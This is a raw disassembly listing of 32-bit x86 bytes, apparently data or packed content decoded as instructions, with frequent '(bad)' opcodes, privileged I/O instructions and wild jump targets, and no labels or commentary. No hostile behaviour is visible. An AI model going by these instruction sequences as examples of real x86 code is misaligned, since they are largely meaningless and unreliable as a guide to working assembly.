  418fa5:	add    al,0x69
  418fa7:	sub    al,0xe3
  418fa9:	push   ss
  418faa:	dec    edx
  418fab:	xor    esi,DWORD PTR [edx]
  418fad:	lds    ebx,FWORD PTR [ecx+0x65]
  418fb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418fb1:	(bad)  
  418fb2:	cmp    al,dl
  418fb4:	pusha  
  418fb5:	add    edi,DWORD PTR [esi]
  418fb7:	pop    ebx
  418fb8:	mov    ss,WORD PTR [edx-0x21a03cc3]
  418fbe:	cmp    BYTE PTR [eax-0x47d63f90],bh
  418fc4:	add    dl,bh
  418fc6:	sub    eax,eax
  418fc8:	popf   
  418fc9:	jmp    0x419008
  418fcb:	pop    ebx
  418fcc:	push   eax
  418fcd:	data16 scas al,BYTE PTR es:[edi]
  418fcf:	scas   eax,DWORD PTR es:[edi]
  418fd0:	push   eax
  418fd1:	pop    esi
  418fd2:	lods   al,BYTE PTR ds:[esi]
  418fd3:	pop    ebx
  418fd4:	push   0x5b42e9
  418fd9:	sar    DWORD PTR ds:0x25e9005f,0xce
  418fe0:	add    ecx,ebp
  418fe2:	cmp    eax,0xd4bdc064
  418fe7:	mov    al,ds:0x5b3d2d43
  418fec:	add    cl,ch
  418fee:	(bad)  
  418fef:	push   ds
  418ff0:	cld    
  418ff1:	mov    ecx,0xeb67b7a7
	...
  41901e:	add    BYTE PTR [eax],al
  419020:	xor    BYTE PTR [edi],ch
  419022:	clc    
  419023:	cmp    DWORD PTR ds:0x50ed71b8,0x4f
  41902a:	js     0x418fde
  41902c:	jp     0x418fe5
  41902e:	or     ch,BYTE PTR [ecx]
  419030:	mov    ecx,0x4574fd61
  419035:	rol    BYTE PTR [ebx-0x1646cd02],0x19
  41903c:	sub    ebp,DWORD PTR [edi]
  41903e:	clc    
  41903f:	shl    DWORD PTR [edi-0x143102b0],0xb7
  419046:	cmp    eax,0x43a04228
  41904b:	mov    ebp,0xe9005b3a
  419050:	rcr    BYTE PTR [esi],0xfc
  419053:	sbb    DWORD PTR [edi+esi*4+0x41aaeb67],edx
  41905a:	add    BYTE PTR [esi-0x302a451],bl
  419060:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419061:	and    al,0x3f
  419063:	jmp    0x4f2b9e
  419068:	stos   DWORD PTR es:[edi],eax
  419069:	inc    edx
  41906a:	std    
  41906b:	jmp    DWORD PTR [edi]
  41906d:	js     0x4190b3
  41906f:	fdiv   st,st(7)
  419071:	pop    edx
  419072:	add    BYTE PTR [eax],al
  419074:	fdiv   st,st(6)
  419076:	fld    DWORD PTR [ecx]
  419078:	daa    
  419079:	pop    ebx
  41907a:	add    bh,bh
  41907c:	hlt    
  41907d:	mov    dh,0x8e
  41907f:	inc    ebp
  419080:	ja     0x4190d2
  419082:	jb     0x41908c
	...
  4190ac:	add    BYTE PTR [eax],al
  4190ae:	pusha  
  4190af:	mul    cl
  4190b1:	(bad)  
  4190b2:	stos   BYTE PTR es:[edi],al
  4190b3:	cmp    ch,0xff
  4190b6:	out    0x5a,eax
  4190b8:	lds    eax,FWORD PTR [ebp-0x7d]
  4190bb:	pop    edi
  4190bc:	add    BYTE PTR [eax],al
  4190be:	xlat   BYTE PTR ds:[ebx]
  4190bf:	ja     0x419105
  4190c1:	lock out 0x5a,eax
  4190c4:	add    BYTE PTR [eax],al
  4190c6:	sbb    dh,dh
  4190c8:	icebp  
  4190c9:	add    bh,dl
  4190cb:	pop    edx
  4190cc:	add    BYTE PTR [ebp-0xb28d66],cl
  4190d2:	cmp    cl,BYTE PTR [esi-0x1b]
  4190d5:	in     eax,0xa4
  4190d7:	pop    edx
  4190d8:	add    BYTE PTR [ebx],cl
  4190da:	push   edi
  4190db:	retf   
  4190dc:	adc    eax,0xfd661283
  4190e1:	jae    0x419071
  4190e3:	dec    edi
  4190e4:	je     0x4190da
  4190e6:	and    BYTE PTR [ebp+0x5f5648a7],dh
  4190ec:	lds    eax,FWORD PTR [ebp-0x35]
  4190ef:	pop    ecx
  4190f0:	add    BYTE PTR [eax],al
  4190f2:	add    DWORD PTR ds:0x1ac7,0x6b
  4190f8:	std    
  4190f9:	call   DWORD PTR [edi+0x5a]
  4190fc:	std    
  4190fd:	jne    0x419092
  4190ff:	dec    edi
  419100:	adc    al,0x6c
  419102:	or     al,0x9a
  419104:	std    
  419105:	or     ah,BYTE PTR [edi+0x3ee81be6]
  41910b:	mov    ds:0x4141fe1a,al
  419110:	(bad)  
  419111:	arpl   WORD PTR [eax],ax
	...
  41913b:	add    BYTE PTR [ebp-0x55fffb7d],al
  419141:	mov    esi,0x79a21414
  419146:	sar    edi,0xf8
  419149:	mov    esi,0xc47f4767
  41914e:	add    al,BYTE PTR [eax]
  419150:	ds inc esp
  419152:	cmp    BYTE PTR [edx+esi*8-0x3d],0x8d
  419157:	or     al,BYTE PTR [ecx]
  419159:	(bad)  
  41915a:	or     eax,0x292073fe
  41915f:	mov    edi,DWORD PTR ds:0x73ff01c4
  419165:	jo     0x419190
  419167:	jae    0x4191a8
  419169:	les    eax,FWORD PTR [ecx]
  41916b:	cld    
  41916c:	or     eax,0xd1fe5a84
  419171:	push   esp
  419172:	adc    al,0xf1
  419174:	cwde   
  419175:	mov    edi,esp
  419177:	push   cs
  419178:	mov    ebx,0xb9fe14a1
  41917d:	sub    al,bh
  41917f:	or     dl,BYTE PTR [ebp-0x5799813c]
  419185:	lods   al,BYTE PTR ds:[esi]
  419186:	adc    DWORD PTR [edi+0x1c43f],esi
  41918c:	stc    
  41918d:	sbb    BYTE PTR [ebx],bh
  41918f:	ret    0x28eb
  419192:	and    BYTE PTR [edx+0x57b48f82],al
  419198:	push   ss
  419199:	mov    bh,0x3
  41919b:	inc    ecx
  41919c:	ds pushf 
  41919e:	xchg   esi,eax
	...
  4191c7:	add    BYTE PTR [eax],al
  4191c9:	add    BYTE PTR [ebp-0xc],bh
  4191cc:	sahf   
  4191cd:	jmp    DWORD PTR [ecx+0x43]
  4191d0:	push   es
  4191d1:	add    BYTE PTR [esi],bh
  4191d3:	pushf  
  4191d4:	shl    BYTE PTR [eax],cl
  4191d6:	pop    ecx
  4191d7:	pop    edx
  4191d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191d9:	sbb    al,0x52
  4191db:	scas   eax,DWORD PTR es:[edi]
  4191dc:	sahf   
  4191dd:	adc    esp,DWORD PTR [ecx-0x5c]
  4191e0:	into   
  4191e1:	adc    al,BYTE PTR [eax-0x3e]
  4191e4:	(bad)  
  4191e5:	jmp    0x41921f
  4191e7:	mov    ch,0xf2
  4191e9:	inc    ebx
  4191ea:	lods   eax,DWORD PTR ds:[esi]
  4191eb:	dec    eax
  4191ec:	(bad)  
  4191ed:	sub    eax,0xff76b461
  4191f2:	loope  0x419223
  4191f4:	loope  0x419240
  4191f6:	inc    edx
  4191f7:	ds mov ah,0xc4
  4191fa:	adc    DWORD PTR [edi+eiz*8+0x3],ebx
  4191fe:	ds inc ebx
  419200:	call   0x3f9cd009
  419205:	ret    0xb453
  419208:	inc    esi
  419209:	shr    DWORD PTR [bx+si],cl
  41920c:	test   al,0x3
  41920e:	add    DWORD PTR [edi],ebx
  419210:	xor    eax,DWORD PTR ds:0x80e75b3f
  419216:	xor    BYTE PTR [edi-0x2af5ed49],0x9a
  41921d:	(bad)  
  41921e:	leave  
  41921f:	mov    esp,0x5b3e058f
  419224:	loop   0x419269
  419226:	xor    cl,BYTE PTR [esi+0x6]
  419229:	(bad)  
  41922b:	sub    BYTE PTR [eax+0x3],ch
	...
  419255:	add    BYTE PTR [eax],al
  419257:	add    BYTE PTR [esi-0x5fed229a],dl
  41925d:	pushf  
  41925e:	in     al,0x71
  419260:	or     al,0x1a
  419262:	out    0x3,eax
  419264:	ds pop ebx
  419266:	out    0x1b,eax
  419268:	jmp    0x4192c0
  41926a:	(bad)  
  41926b:	adc    bl,BYTE PTR [ecx+0x7812f076]
  419271:	inc    ebx
  419272:	sbb    eax,0xcf5afecb
  419277:	cmp    DWORD PTR [edx-0x4c],esi
  41927a:	add    BYTE PTR [esi+0x62539922],dh
  419280:	cmp    DWORD PTR [eax+ebx*2],esp
  419283:	adc    eax,edi
  419285:	pop    ecx
  419286:	aas    
  419287:	jmp    0xaa40bcc1
  41928c:	sub    al,0x42
  41928e:	add    BYTE PTR [ecx-0x16ffa47e],al
  419294:	test   DWORD PTR [ebp+edi*8-0x3d5dc217],esi
  41929b:	in     eax,dx
  41929c:	cmp    eax,0x4c01580b
  4192a1:	pop    edx
  4192a2:	aas    
  4192a3:	jmp    0x2a40bced
  4192a8:	sub    al,0x3c
  4192aa:	mov    cl,0xeb
  4192ac:	cli    
  4192ad:	mov    bl,0xe5
  4192af:	add    DWORD PTR [edx+0x5b],0xb4df5100
  4192b6:	std    
  4192b7:	ds inc ebp
  4192b9:	and    esi,ebx
  4192bb:	add    BYTE PTR ss:[eax],al
	...
  4192e6:	dec    esp
  4192e7:	mov    esp,0xb52c36ed
  4192ec:	call   0xfdf6d831
  4192f1:	push   0xffffffee
  4192f3:	ds dec ebx
  4192f5:	test   al,0x3d
  4192f7:	pop    ebx
  4192f8:	je     0x4192ea
  4192fa:	shl    BYTE PTR [esi+0x64],0xb2
  4192fe:	jp     0x4192b3
  419300:	std    
  419301:	jne    0x41933a
  419303:	mov    ah,0x13
  419305:	(bad)  
  419306:	loopne 0x419322
  419308:	add    BYTE PTR [esi],ah
  41930a:	inc    esi
  41930b:	add    DWORD PTR [ecx+0x28],ecx
  41930e:	cmp    bl,BYTE PTR [edx+0x0]
  419311:	jmp    0xd5574ed3
  419316:	das    
  419317:	mov    ch,0xe8
  419319:	repz dec eax
  41931b:	mov    ch,0xfd
  41931d:	add    BYTE PTR [esi+ebp*8+0x5e726855],ah
  419324:	aas    
  419325:	add    BYTE PTR [edi-0x573cff34],ch
  41932b:	push   esi
  41932c:	xor    eax,0xb7576701
  419331:	pop    es
  419332:	push   edi
  419333:	push   edi
  419334:	add    BYTE PTR [ebx],dh
  419336:	test   DWORD PTR [ecx-0x10],edx
  419339:	or     ebp,0x5a
  41933c:	jae    0x419340
  41933e:	int3   
  41933f:	pop    ecx
  419340:	jmp    0xff20632e
  419345:	jmp    FWORD PTR [eax+0xfa724f]
	...
  419373:	add    BYTE PTR [eax+0x6f00674c],ch
  419379:	xchg   edx,eax
  41937a:	add    BYTE PTR [eax],al
  41937c:	pop    ss
  41937d:	jae    0x41937d
  41937f:	and    eax,0x40de33
  419384:	mov    BYTE PTR [edx+0x5ea68125],bh
  41938a:	std    
  41938b:	and    eax,0x40de3b
  419390:	sub    BYTE PTR [edx+0x5ea6812d],bh
  419396:	std    
  419397:	and    eax,0x40ddf3
  41939c:	sub    BYTE PTR [edx+0x5e968135],bh
  4193a2:	std    
  4193a3:	and    eax,0x40dd8b
  4193a8:	cmp    BYTE PTR [edx+0x5ed6813d],bh
  4193ae:	std    
  4193af:	and    eax,0x40ddd3
  4193b4:	test   al,0xb9
  4193b6:	inc    ebp
  4193b7:	and    DWORD PTR [esi+0x57],0xde5b25fd
  4193be:	inc    eax
  4193bf:	add    BYTE PTR [esi],bh
  4193c1:	mov    esi,esp
  4193c3:	dec    edi
  4193c4:	mov    edi,0x1bff0483
  4193c9:	push   eax
  4193ca:	add    DWORD PTR [eax+0x3e],0xbf57e6f1
  4193d1:	add    DWORD PTR [edi+edi*8],0x23
  4193d5:	pusha  
  4193d6:	add    DWORD PTR [eax+0x0],0x0
	...
  419401:	add    BYTE PTR [esi],bh
  419403:	stc    
  419404:	out    0x5f,al
  419406:	mov    edi,0x1bff0483
  41940b:	pusha  
  41940c:	add    DWORD PTR [eax+0x3e],0xbf67e6e1
  419413:	add    BYTE PTR [edi+edi*8],0x63
  419417:	pusha  
  419418:	add    DWORD PTR [eax+0x3e],0xbf6fe629
  41941f:	add    BYTE PTR [edi+edi*8],0x5b
  419423:	nop
  419424:	add    BYTE PTR [eax+0x3e],0x11
  419428:	out    0x77,al
  41942a:	mov    edi,0x23ff0202
  41942f:	mov    al,ds:0x193e4082
  419434:	out    0x7f,al
  419436:	mov    edi,0x1bff0202
  41943b:	inc    eax
  41943c:	add    BYTE PTR [eax+0x3e],0x81
  419440:	out    0x87,al
  419442:	mov    edi,0x23ff0202
  419447:	inc    eax
  419448:	add    BYTE PTR [eax+0x3e],0x49
  41944c:	out    0x8f,al
  41944e:	mov    edi,0x5bff0202
  419453:	adc    BYTE PTR [edx-0x1c4ec1c0],al
  419459:	xchg   edi,eax
  41945a:	mov    edi,0x63ff0202
  41945f:	and    BYTE PTR [edx-0x19a4c1c0],al
  419465:	jmp    0x41946a
	...
  41948e:	add    BYTE PTR [eax],al
  419490:	test   eax,0x810428db
  419495:	ja     0x419422
  419497:	test   esi,edi
  419499:	pop    edx
  41949a:	into   
  41949b:	jmp    0x46a7039
  4194a0:	imul   esi,DWORD PTR [edi-0x75],0xb65afe85
  4194a7:	jmp    0x46a7055
  4194ac:	push   ecx
  4194ad:	ja     0x41950a
  4194af:	test   esi,edi
  4194b1:	pop    edx
  4194b2:	sahf   
  4194b3:	jmp    0x46a7041
  4194b8:	cmp    DWORD PTR [edi+0x4b],esi
  4194bb:	test   DWORD PTR [esi+0x5b],edi
  4194be:	xchg   cl,ch
  4194c0:	jmp    0x2145bd9f
  4194c5:	ja     0x419472
  4194c7:	test   DWORD PTR [esi+0x5b],edi
  4194ca:	outs   dx,BYTE PTR ds:[esi]
  4194cb:	jmp    0x3ea6fc9
  4194d0:	or     DWORD PTR [edi+0x2b],esi
  4194d3:	test   DWORD PTR [esi+0x5b],edi
  4194d6:	push   esi
  4194d7:	jmp    0x3ea6fe5
  4194dc:	icebp  
  4194dd:	jbe    0x4194fa
  4194df:	test   DWORD PTR [esi+0x5b],edi
  4194e2:	ds jmp 0x3ea6ff1
  4194e8:	fnstenv [esi+0xb]
  4194eb:	test   DWORD PTR [esi+0x5b],edi
  4194ee:	es jmp 0x3ea6fdd
	...
  41951c:	add    BYTE PTR [eax],al
  41951e:	shl    DWORD PTR [esi+0xb],0x85
  419522:	(bad)  
  419523:	pop    edx
  419524:	push   cs
  419525:	jmp    0x3ea6fc3
  41952a:	test   eax,0xfe850b76
  41952f:	pop    edx
  419530:	add    dh,dh
  419532:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419533:	sar    BYTE PTR [edi-0x58],0x3d
  419537:	mov    al,0x23
  419539:	loope  0x4194fd
  41953b:	sbb    eax,DWORD PTR [eax]
  41953d:	ficom  WORD PTR [esi+0x42287fb4]
  419543:	mov    al,0x23
  419545:	jmp    0xc641b109
  41954a:	push   esi
  41954b:	pop    esp
  41954c:	sub    BYTE PTR [eax],0x3a
  41954f:	mov    al,0x23
  419551:	loope  0x419512
  419553:	sbb    eax,DWORD PTR [eax]
  419555:	scas   al,BYTE PTR es:[edi]
  419556:	data16 sub BYTE PTR fs:[eax],0x42
  41955b:	mov    al,0x23
  41955d:	cmc    
  41955e:	mov    edi,0x2696001b
  419563:	push   esp
  419564:	sub    BYTE PTR [eax],0x3a
  419567:	mov    al,0x23
  419569:	leave  
  41956a:	mov    edi,0x167e001a
  41956f:	jl     0x4194f3
  419571:	sub    BYTE PTR [edx-0x50],al
  419574:	and    eax,ecx
  419576:	mov    edi,0x1666001a
  41957b:	test   BYTE PTR [edx+0x23b03da8],al
  419581:	sbb    DWORD PTR [eax],eax
	...
  4195ab:	add    BYTE PTR [edx+ebx*1+0x6be64e00],bh
  4195b2:	sub    BYTE PTR [eax+0x123b03d],0xbc
  4195b9:	sbb    al,BYTE PTR [eax]
  4195bb:	ss out 0x73,al
  4195be:	sub    BYTE PTR [eax-0x56dc4fc3],0xbf
  4195c5:	sbb    al,BYTE PTR [eax]
  4195c7:	push   ds
  4195c8:	(bad)  
  4195c9:	sbb    eax,DWORD PTR [edx+0x23b03da8]
  4195cf:	popf   
  4195d0:	mov    edi,0x4000001a
  4195d5:	ret    
  4195d6:	push   ecx
  4195d7:	adc    dh,0x5b
  4195da:	std    
  4195db:	and    eax,0x40d9af
  4195e0:	mov    al,ds:0x56825db7
  4195e5:	push   edi
  4195e6:	std    
  4195e7:	and    eax,0x40dcfb
  4195ec:	nop
  4195ed:	mov    bh,0x65
  4195ef:	and    BYTE PTR [esi],0x57
  4195f2:	std    
  4195f3:	and    eax,0x40dd13
  4195f8:	mov    al,ds:0x26826db7
  4195fd:	push   edi
  4195fe:	std    
  4195ff:	and    eax,0x40dd0b
  419604:	mov    al,ds:0x168279b7
  419609:	push   edi
  41960a:	std    
  41960b:	and    eax,0x40d9a7
	...
  419638:	add    BYTE PTR [eax],al
  41963a:	shl    BYTE PTR [esi+0x57568281],0xfd
  419641:	and    eax,0x40d9af
  419646:	nop
  419647:	mov    dh,0x89
  419649:	and    BYTE PTR [esi+0x57],0xfd
  41964d:	and    eax,0x40d987
  419652:	pusha  
  419653:	mov    dh,0x91
  419655:	and    BYTE PTR [esi+0x6f25fd5a],0xd9
  41965c:	inc    eax
  41965d:	add    BYTE PTR [eax-0x697d664a],al
  419663:	pop    edx
  419664:	std    
  419665:	and    eax,0x40d9c7
  41966a:	and    BYTE PTR [esi+0x5a9682a5],dh
  419670:	std    
  419671:	and    eax,0x40d973
  419676:	ds cmp eax,ecx
  419679:	and    edi,DWORD PTR [edx]
  41967b:	inc    ecx
  41967c:	or     al,0x1
  41967e:	sub    ebp,DWORD PTR [ecx+ecx*2+0x1c43e63]
  419685:	ret    0xc442
  419688:	xor    bh,0x3a
  41968b:	aas    
  41968c:	stc    
  41968d:	mov    bh,0x3c
  41968f:	les    eax,FWORD PTR [ecx]
  419691:	add    BYTE PTR [eax+edi*4+0x1],bh
  419695:	xor    DWORD PTR [esi-0x44],0xffffff8e
  419699:	pop    es
  41969a:	mov    dh,0xb8
  41969c:	add    DWORD PTR [eax],eax
	...
  4196c6:	add    BYTE PTR [eax],al
  4196c8:	add    al,BYTE PTR ds:[esi]
  4196cb:	add    BYTE PTR [ebp+0x467cf19c],bh
  4196d1:	sub    al,0x3
  4196d3:	add    BYTE PTR [esi],bh
  4196d5:	les    edi,FWORD PTR [edi]
  4196d7:	add    edi,DWORD PTR [esi]
  4196d9:	inc    ecx
  4196da:	or     DWORD PTR [edi],ebx
  4196dc:	ret    
  4196dd:	stos   DWORD PTR es:[edi],eax
  4196de:	dec    ecx
  4196df:	pop    es
  4196e0:	les    eax,FWORD PTR ds:[ecx]
  4196e3:	ret    0xc43a
  4196e6:	xor    bh,0x7e
  4196e9:	push   edi
  4196ea:	cld    
  4196eb:	mov    bh,0x34
  4196ed:	les    eax,FWORD PTR [ecx]
  4196ef:	add    ah,bh
  4196f1:	mov    edi,0xc3be3d01
  4196f6:	add    DWORD PTR [eax],eax
  4196f8:	mov    ebp,DWORD PTR [ecx+ecx*2+0x1c43e0b]
  4196ff:	ret    0xc442
  419702:	into   
  419703:	(bad)  
  419704:	les    eax,FWORD PTR ds:[ecx]
  419707:	jge    0x41973f
  419709:	fdiv   st(3),st
  41970b:	jmp    ecx
  41970d:	ret    
  41970e:	aas    
  41970f:	add    edi,DWORD PTR [esi]
  419711:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419712:	add    DWORD PTR [edx],eax
  419714:	les    ecx,FWORD PTR ds:[esi-0x8a579f9]
  41971b:	add    edi,DWORD PTR [esi]
  41971d:	pop    ebx
  41971e:	sub    DWORD PTR [edi],eax
  419720:	ds jo  0x41970a
  419723:	pop    es
  419724:	ds pop ebx
  419726:	mov    ebx,?
  419728:	icebp  
  419729:	dec    eax
  41972a:	out    0x3,eax
	...
  419754:	add    BYTE PTR [eax],al
  419756:	ds cdq 
  419758:	jecxz  0x41975d
  41975a:	pop    ebx
  41975b:	pop    ebx
  41975c:	fild   WORD PTR [ebx]
  41975e:	ds xor bh,bl
  419761:	dec    ebx
  419762:	sub    eax,0x7c03e75b
  419767:	push   esi
  419768:	out    0xc8,eax
  41976a:	jns    0x4197c9
  41976c:	out    0x3,eax
  41976e:	repz bound ecx,QWORD PTR [edi-0x1852960e]
  419775:	inc    ebp
  419776:	cmp    eax,0x1e03fc5b
  41977b:	pop    ebx
  41977c:	out    0x88,eax
  41977e:	cmp    ebx,esi
  419780:	iret   
  419781:	add    edi,DWORD PTR [esi]
  419783:	pop    ebx
  419784:	test   eax,0xe7703e00
  419789:	ret    
  41978a:	cmp    DWORD PTR [ebp+0x51e9fc14],ebp
  419790:	out    0x3,eax
  419792:	ds cdq 
  419794:	jmp    0x419799
  419796:	arpl   WORD PTR [ebx+0x67],bx
  419799:	add    al,0x3e
  41979b:	fisttp WORD PTR cs:[ebx+0x35]
  41979f:	pop    ebx
  4197a0:	out    0x3,eax
  4197a2:	cld    
  4197a3:	push   edi
  4197a4:	out    0xd6,eax
  4197a6:	imul   BYTE PTR [esi-0x19]
  4197a9:	add    edi,DWORD PTR [edi]
  4197ab:	pop    ebx
  4197ac:	out    0x68,al
  4197ae:	(bad)  
  4197af:	ficomp WORD PTR [ebx+0x28e04bfc]
  4197b5:	inc    esi
  4197b6:	cmp    eax,0x856a5b
	...
  4197e3:	add    BYTE PTR ds:0x3de90057,dh
  4197e9:	lods   al,BYTE PTR ds:[esi]
  4197ea:	jae    0x4197b8
  4197ec:	dec    eax
  4197ed:	fist   DWORD PTR [eax]
  4197ef:	in     eax,dx
  4197f0:	cmp    eax,0xaa68875b
  4197f5:	pop    eax
  4197f6:	add    cl,ch
  4197f8:	jge    0x41978f
  4197fa:	jg     0x4197e9
  4197fc:	test   eax,0x3df1fdac
  419801:	pop    ebx
  419802:	add    BYTE PTR [eax-0x3d],dh
  419805:	pop    esp
  419806:	add    al,0xe9
  419808:	cmp    eax,0x89c57cd8
  41980d:	lods   al,BYTE PTR ds:[esi]
  41980e:	mov    dh,BYTE PTR [eax-0x6b]
  419811:	pop    eax
  419812:	add    cl,ch
  419814:	leave  
  419815:	popa   
  419816:	mov    ch,al
  419818:	cmp    ebx,DWORD PTR [ebx+0x5ae5a9fe]
  41981e:	ret    0x3ded
  419821:	mov    ebx,DWORD PTR [edi]
  419823:	stos   DWORD PTR es:[edi],eax
  419824:	pop    ecx
  419825:	lods   al,BYTE PTR ds:[esi]
  419826:	sub    BYTE PTR [eax+0x59],0x58
  41982a:	add    cl,ch
  41982c:	xor    al,0x27
  41982e:	sbb    esi,DWORD PTR [edx-0x46]
  419831:	pop    esp
  419832:	add    al,0xe9
  419834:	cmp    eax,0x31f17fe2
  419839:	lods   al,BYTE PTR ds:[esi]
  41983a:	std    
  41983b:	sub    DWORD PTR [ebp-0x25],edi
  41983e:	sbb    al,0xed
  419840:	cmp    eax,0x3de9085b
  419845:	pop    ebx
  419846:	xchg   DWORD PTR [eax+0x0],ebp
	...
  419871:	add    BYTE PTR ds:0x88e90058,cl
  419877:	jecxz  0x419891
  419879:	in     eax,dx
  41987a:	cmp    eax,0x8108d05b
  41987f:	fnstcw WORD PTR [edi-0xb]
  419882:	icebp  
  419883:	stos   DWORD PTR es:[edi],eax
  419884:	std    
  419885:	dec    esi
  419886:	into   
  419887:	dec    esi
  419888:	mov    DWORD PTR [eax],eax
  41988a:	push   esi
  41988b:	test   al,0x1
  41988d:	add    bh,ah
  41988f:	sbb    BYTE PTR cs:[eax],0xe3
  419893:	push   edi
  419894:	add    BYTE PTR [eax+0x20],al
  419897:	xlat   BYTE PTR ds:[ebx]
  419898:	sbb    DWORD PTR [edi+edx*8],eax
  41989b:	push   edi
  41989c:	or     BYTE PTR [eax],al
  41989e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41989f:	push   edi
  4198a0:	xchg   DWORD PTR [ecx-0x25449],eax
  4198a6:	sbb    al,0x2f
  4198a8:	adc    eax,0x8a579704
  4198ad:	add    DWORD PTR [ebp+0x1fc0fb17],esp
  4198b3:	push   edi
  4198b4:	ror    DWORD PTR [ebx-0x74fe741d],0x43
  4198bb:	mov    ebx,0xea315501
  4198c0:	xor    dh,dh
  4198c2:	(bad)  
  4198c4:	std    
  4198c5:	mov    cl,BYTE PTR [edi-0x39fe192b]
  4198cb:	dec    esi
  4198cc:	inc    ebx
  4198cd:	lea    esi,[ebx-0x16]
  4198d0:	cmp    al,0x66
  4198d3:	retf   0x83ed
	...
  4198fe:	add    BYTE PTR [eax],al
  419900:	mov    DWORD PTR [edi-0x45],edx
  419903:	call   FWORD PTR [eax+0x5a8dfe61]
  419909:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41990a:	jno    0x41997e
  41990c:	je     0x419936
  41990e:	inc    BYTE PTR [ecx]
  419910:	jle    0x4198c5
  419912:	add    DWORD PTR [eax],eax
  419914:	pop    ss
  419915:	ficomp DWORD PTR [eax]
  419917:	mov    esp,DWORD PTR [esi+0x270001af]
  41991d:	sbb    BYTE PTR es:[eax],0x23
  419921:	pop    edi
  419922:	add    BYTE PTR [eax-0x72],al
  419925:	push   ss
  419926:	sbb    DWORD PTR [edi+eiz*8],eax
  419929:	pop    esi
  41992a:	xchg   DWORD PTR [ecx-0x25bc2],eax
  419930:	jmp    0x3a591a72
  419935:	mov    ah,0x1
  419937:	idiv   ah
  419939:	mov    bl,0x8d
  41993b:	or     esp,eax
  41993d:	mov    WORD PTR [ebx],es
  41993f:	fcmovne st,st(0)
  419941:	jne    0x4199bf
  419943:	pop    ss
  419944:	aad    0xb6
  419946:	xor    DWORD PTR [edi],ebx
  419948:	aas    
  419949:	or     ebp,eax
  41994b:	add    edi,DWORD PTR [esi]
  41994d:	mov    ah,0x8e
  41994f:	sbb    BYTE PTR [ebp+0x3e03f433],dh
  419955:	mov    ah,0x7a
  419957:	xor    BYTE PTR [esi],0xc0
  41995a:	add    DWORD PTR [eax],eax
  41995c:	(bad)  
  41995d:	cmp    cl,BYTE PTR [ecx+0x1b]
  419960:	inc    edx
  419961:	mov    ah,0x1
  419963:	mov    DWORD PTR [eax],eax
	...
  41998d:	add    BYTE PTR [edi+0x79fffda4],bh
  419993:	sub    eax,0xb43a1782
  419998:	add    DWORD PTR [edx-0x2d349ba],ecx
  41999e:	jge    0x419963
  4199a0:	sbb    eax,DWORD PTR [edx+0x1779b368]
  4199a6:	retf   
  4199a7:	add    eax,0x989700ac
  4199ac:	std    
  4199ad:	inc    DWORD PTR [ecx+0x47]
  4199b0:	jmp    0xfde5593f
  4199b5:	push   DWORD PTR [ecx]
  4199b7:	cmp    eax,DWORD PTR [edx+0x1b44217]
  4199bd:	inc    eax
  4199be:	mov    bh,0x1a
  4199c0:	in     eax,0x3
  4199c2:	ds mov ah,0x7a
  4199c5:	sub    BYTE PTR [esi],0xb8
  4199c8:	add    DWORD PTR [eax],eax
  4199ca:	mov    ch,0x32
  4199cc:	jmp    0xe79cd7d4
  4199d1:	adc    edi,edi
  4199d3:	pop    ebx
  4199d4:	sar    ebp,cl
  4199d6:	(bad)  
  4199d7:	dec    edx
  4199d8:	jmp    0x5fde8512
  4199dd:	repz aam 0x5c
  4199e0:	pop    ss
  4199e1:	jecxz  0x419a21
  4199e3:	hlt    
  4199e4:	(bad)  
  4199e6:	shr    DWORD PTR [ecx-0x244b1544],1
  4199ec:	xlat   BYTE PTR ds:[ebx]
  4199ed:	inc    ecx
  4199ef:	test   eax,0x8270
	...
  419a1c:	push   ecx
  419a1d:	pop    edi
  419a1e:	out    0x3,eax
  419a20:	(bad)  
  419a21:	rcl    DWORD PTR [eax-0x19],cl
  419a24:	cmp    eax,0xbe7ae75b
  419a29:	dec    edx
  419a2a:	jmp    0x419a2f
  419a2c:	ds (bad) 
  419a2e:	jo     0x419a1b
  419a30:	cmp    eax,0x5e33e75b
  419a35:	or     cl,BYTE PTR [ebp-0x18a1805a]
  419a3b:	mov    dl,0x12
  419a3d:	(bad)  
  419a3e:	dec    ebx
  419a3f:	loopne 0x419a82
  419a41:	adc    DWORD PTR [edx],ebx
  419a43:	inc    esp
  419a44:	adc    dh,bl
  419a46:	int3   
  419a47:	imul   ebx
  419a49:	pop    edi
  419a4a:	test   bh,dh
  419a4c:	pop    ecx
  419a4d:	test   eax,0x7ed57ae7
  419a52:	fstp   TBYTE PTR [edx+0x50]
  419a55:	jne    0x419a0b
  419a57:	jns    0x419a36
  419a59:	jle    0x419a42
  419a5b:	jns    0x419ab5
  419a5d:	ffreep st(2)
  419a5f:	nop
  419a60:	push   ecx
  419a61:	aam    0xa4
  419a63:	jnp    0x419a78
  419a65:	xlat   BYTE PTR ds:[ebx]
  419a66:	jb     0x419a6c
  419a68:	ds pop ebx
  419a6a:	out    0xc9,eax
  419a6c:	aaa    
  419a6d:	das    
  419a6e:	in     eax,0xbc
  419a70:	jg     0x419a50
  419a72:	add    BYTE PTR [eax-0x567e5151],ah
  419a78:	add    eax,esp
  419a7a:	(bad)  
  419a7b:	fdivr  st(5),st
  419a7d:	ffree  st(0)
  419a7f:	jmp    0x419a81
	...
  419aa9:	add    BYTE PTR [ebp+ebx*2-0x7f],dl
  419aad:	sub    ecx,ebp
  419aaf:	and    DWORD PTR [esi+0x6a],eax
  419ab2:	(bad)  
  419ab3:	jl     0x419ad1
  419ab5:	call   0x9f9f3168
  419aba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419abb:	add    eax,0xd43de5c2
  419ac0:	push   esp
  419ac1:	add    eax,0x72560e3e
  419ac6:	push   ebx
  419ac7:	mov    eax,ds:0xa8b1d186
  419acc:	std    
  419acd:	jmp    0x6341f60f
  419ad2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ad3:	fadd   st(7),st
  419ad5:	neg    BYTE PTR [ecx]
  419ad7:	js     0x419ad8
  419ad9:	call   0x75caab1b
  419ade:	imul   ecx,DWORD PTR [ecx+eax*4-0x12],0xa6032e88
